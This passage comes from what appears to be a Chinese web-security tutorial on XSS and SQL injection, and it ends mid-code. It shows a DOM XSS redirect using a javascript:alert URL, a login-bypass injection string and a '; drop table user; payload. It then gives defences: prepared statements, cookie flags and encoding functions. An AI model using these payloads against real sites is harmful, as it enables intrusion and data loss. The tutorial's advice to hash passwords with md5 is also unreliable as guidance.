  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;='test'&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    location.href &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; url;
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;刷新下页面，也会弹出窗口执行 xss攻击了。&lt;/p&gt;

&lt;p&gt;五：SQL注入&lt;/p&gt;
&lt;p&gt;SQL注入是通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。&lt;br/&gt;什么意思呢？我们来打个比方：我们有一个登录框，需要输入用户名和密码对吧，然后我们的密码输入 'or '123' = '123 这样的。&lt;br/&gt;我们在查询用户名和密码是否正确的时候，本来执行的sql语句是：select * from user where username = '' and password = ''. 这样的sql语句，现在我们输入密码是如上这样的，然后我们会通过参数进行拼接，拼接后的sql语句就是：&lt;br/&gt;&lt;strong&gt;select * from user where username = '' and password = ' ' or '123' = '123 ';&lt;/strong&gt; 这样的了，那么会有一个or语句，只要这两个有一个是正确的话，就条件成立，因此 123 = 123 是成立的。因此验证就会被跳过。这只是一个简单的列子，比如还有密码比如是这样的：'; drop table user;, 这样的话，那么sql命令就变成了：&lt;br/&gt;&lt;strong&gt;select * from user where username = '' and password = ''; drop table user;'&lt;/strong&gt; , 那么这个时候我们会把user表直接删除了。&lt;/p&gt;
&lt;p&gt;sql被攻击的原因是：sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防范的方法：&lt;/strong&gt;&lt;br/&gt;1. 我们可以使用预编译语句(PreparedStatement，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。&lt;br/&gt;2. 数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的方式。&lt;/p&gt;

&lt;p&gt;cookie安全策略&lt;/p&gt;
&lt;p&gt;在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;http-only:&lt;/strong&gt; 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.&lt;br/&gt;&lt;strong&gt;secure-only:&lt;/strong&gt; 只允许https请求读取，发送请求时自动发送cookie。&lt;br/&gt;&lt;strong&gt;host-only:&lt;/strong&gt; 只允许主机域名与domain设置完成一致的网站才能访问该cookie。&lt;/p&gt;

&lt;p&gt;X-XSS-Protection设置&lt;/p&gt;
&lt;p&gt;目前该属性被所有的主流浏览器默认开启XSS保护。该参数是设置在响应头中目的是用来防范XSS攻击的。它有如下几种配置：&lt;br/&gt;值有如下几种：默认为1.&lt;br/&gt;0：禁用XSS保护。&lt;br/&gt;1：启用XSS保护。&lt;br/&gt;1;mode=block; 启用xss保护，并且在检查到XSS攻击是，停止渲染页面。&lt;/p&gt;

&lt;p&gt;XSS防御HTML编码&lt;/p&gt;
&lt;p&gt;我们为什么要防御HTML编码呢？比如如下html代码：&amp;lt;div&amp;gt;${content}&amp;lt;/div&amp;gt;, 在div标签中存在一个输出变量${content}. 那么浏览器在解析的过程中，首先是html解析，当解析到div标签时，再解析 ${content}的内容，然后会将页面显示出来。&lt;br/&gt;那假如该 ${content} 的值是 &amp;lt;script&amp;gt;alert('XSS攻击')&amp;lt;/script&amp;gt; 这样的呢？因此该script脚本就会解析并且执行了，从而达到XSS的攻击目标。&lt;br/&gt;因此我们需要将不可信数据放入到html标签内(比如div、span等)的时候需要进行html编码。&lt;br/&gt;编码规则：将 &amp;amp; &amp;lt; &amp;gt; &quot; ' / 转义为实体字符。如下基本转义代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(str) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; s = ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (str.length === 0&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (s +&lt;span&gt; str)
        .replace(&lt;/span&gt;/&amp;amp;/g, &quot;&amp;amp;amp;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;lt;/g, &quot;&amp;amp;lt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;gt;/g, &quot;&amp;amp;gt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/ /g, &quot;&amp;amp;nbsp;&quot;)
        .replace(/\'/g, &quot;&amp;amp;#39&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/\&quot;/g, &quot;&amp;amp;quot;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/\//g, '&amp;amp;#x2F;'&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html解码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(str) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; s = ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (str.length === 0&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (s +&lt;span&gt; str)
        .replace(&lt;/span&gt;/&amp;amp;amp;/g, &quot;&amp;amp;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;lt;/g, &quot;&amp;lt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;gt;/g, &quot;&amp;gt;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;nbsp;/g, &quot; &quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;#39/g, &quot;\'&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;quot;/g, &quot;\&quot;&quot;&lt;span&gt;)
        .replace(&lt;/span&gt;/&amp;amp;#x2F;/g, &quot;\/&quot;&lt;span&gt;);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;实现demo如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
        &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(str) {
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (str.length &lt;/span&gt;&lt;span&gt;===&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
          }
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (s &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; str)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt; &lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &quot;&amp;amp;nbsp;&quot;)&lt;/span&gt;
&lt;span&gt;            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;#39&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;quot;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\/&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;#x2F;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html解码&lt;/span&gt;
        &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(str) {
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (str.length &lt;/span&gt;&lt;span&gt;===&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
          }
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (s &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; str)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;#39&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;#x2F;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 测试代码：&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt;&lt;span&gt; html &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;br&amp;gt;aaaaaa&amp;lt;p&amp;gt;xxxxxx&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; encodeHtml &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(html);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出：使用正则表达式对html编码：&amp;amp;lt;br&amp;amp;gt;aaaaaa&amp;amp;lt;p&amp;amp;gt;xxxxxx&amp;amp;lt;&amp;amp;#x2F;p&amp;amp;gt;&lt;/span&gt;
&lt;span&gt;        console.log(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;使用正则表达式对html编码：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; encodeHtml);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; decodeHtml &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(encodeHtml);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出：使用正则表达式对html解码：&amp;lt;br&amp;gt;aaaaaa&amp;lt;p&amp;gt;xxxxxx&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span&gt;        console.log(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;使用正则表达式对html解码：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; decodeHtml);

      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS 防御HTML Attribute编码&lt;/p&gt;
&lt;p&gt;和HTML编码一样，html中的属性也要进行编码，比如 &amp;lt;input name=&quot;${name}&quot; /&amp;gt; 这样的，name是input的属性，因此在html解析时，会对name属性进行编码，因为假如${name} 的值为：&quot; &quot; onclick=&quot;alert('属性XSS')&quot; &quot; &quot; 这样的，也就是说input变成这样的了，&amp;lt;input name=&quot; &quot; onclick=&quot;alert('属性XSS')&quot; &quot; &quot;&amp;gt;&amp;lt;/input&amp;gt;，input属性name被插入onclick事件了，因此也需要针对这种常规的html属性，都需要对其进行HTML属性编码。&lt;br/&gt;因此我们需要将不可信数据放入html属性时(不含src、href、style 和 事件处理函数(onclick, onmouseover等))。需要进行HTML Attribute 编码。&lt;br/&gt;编码规则：除了字母、数字、字符以外，使用 &amp;amp;#x;16进制格式来转义ASCII值小于256所有的字符。&lt;/p&gt;
&lt;p&gt;因此编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
      let encoded &lt;/span&gt;= ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
        let ch &lt;/span&gt;= hex =&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
          hex &lt;/span&gt;= '&amp;amp;#x' + ch.charCodeAt(0).toString(16) + ';'&lt;span&gt;;
        }
        encoded &lt;/span&gt;+=&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
   };&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS防御之javascript编码&lt;/p&gt;
&lt;p&gt;在上面的 XSS 防御HTML Attribute编码中我们是可以防御XSS攻击，但是它只能防御的是HTML通用属性，并不是全部属性，在html中还存在很多支持协议解析的html属性，比如 onclick, onerror, href, src 等这些，类似这些属性我们是无法通过HTML编码来防范XSS攻击的。因为浏览器会先解析html编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，因此游览器在HTML解码后，对该属性的值进行JS解析，因此会执行响应的代码。&lt;/p&gt;
&lt;p&gt;比如如下代码：&amp;lt;a href=&quot;javascript:alert('href xss')&quot; target=&quot;_blank&quot;&amp;gt;href xss&amp;lt;/a&amp;gt; 是可以点击的。 如果我们对该进行html属性编码一下，还是可以点击的，&lt;br/&gt;如代码：&amp;lt;a href=&quot;javascript&amp;amp;#x3a;alert&amp;amp;#x28;&amp;amp;#x27;href&amp;amp;#x20;xss&amp;amp;#x20;HTML编码无效&amp;amp;#x27;&amp;amp;#x29;&quot; target=&quot;_blank&quot;&amp;gt;href xss HTML属性编码无效&amp;lt;/a&amp;gt; 页面还是可以点击的。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522232335640-699376024.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如下对href属性编码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; str = &quot;javascript:alert('href xss')&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let ch &lt;/span&gt;= hex =&lt;span&gt; str[i];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
      hex &lt;/span&gt;= '&amp;amp;#x' + ch.charCodeAt(0).toString(16) + ';'&lt;span&gt;;
    }
    encoded &lt;/span&gt;+=&lt;span&gt; hex;
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};
console.log(encodeForHTMLAttibute(str)); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; javascript&amp;amp;#x3a;alert&amp;amp;#x28;&amp;amp;#x27;href&amp;amp;#x20;xss&amp;amp;#x27;&amp;amp;#x29;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么现在假如我们对alert('href xss')进行JavaScript编码，结果又会如何？（JavaScript编码将字符编码成\x+16进制的形式，对款字节编码成Unicode）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：XSS防御之javascript编码代码如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let cc &lt;/span&gt;= hex =&lt;span&gt; str[i];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
      hex &lt;/span&gt;= '\\x' + cc.charCodeAt().toString(16&lt;span&gt;);
    }
    encoded &lt;/span&gt;+=&lt;span&gt; hex;
  }
